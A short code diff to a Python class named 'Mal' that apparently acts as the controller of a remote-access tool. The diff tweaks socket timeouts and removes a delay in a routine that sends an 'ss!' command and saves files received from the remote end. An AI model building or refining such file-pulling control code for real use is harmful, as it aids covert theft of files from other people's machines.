@@ -39,8 +39,8 @@ class Mal():
             f = open(f_name,'wb')
         except:
             f = open("TMPfailled",'wb')
-        self.c.settimeout(1)
         d = self.c.recv(1024)
+        self.c.settimeout(2)
         while(d):
             f.write(d)
             try:
@@ -67,7 +67,6 @@ class Mal():
 
             elif (cmd[:3] == "ss!"):
                 self.c.send(cmd.encode())
-                time.sleep(1)
                 self.download_file(cmd[4:])
                 
 
